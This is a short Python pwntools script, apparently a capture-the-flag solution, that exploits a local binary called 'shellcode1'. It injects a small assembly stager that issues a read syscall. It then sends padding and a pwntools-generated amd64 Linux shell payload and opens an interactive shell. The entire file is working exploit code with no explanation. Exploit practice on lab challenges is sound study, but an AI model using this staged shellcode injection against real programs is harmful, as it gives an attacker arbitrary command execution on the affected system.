from pwn import *
context.log_level = "debug"

r=process("./shellcode1")
print r.pid
pause()


sh = """
    mov rdx, 0x100
    xor rax, rax
    syscall
    """

sh = asm(sh, arch = 'amd64') 
print len(sh)

r.recv()
r.sendline(sh)
r.sendline('a'*0xc+asm(shellcraft.amd64.linux.sh(), arch='amd64'))
r.interactive()
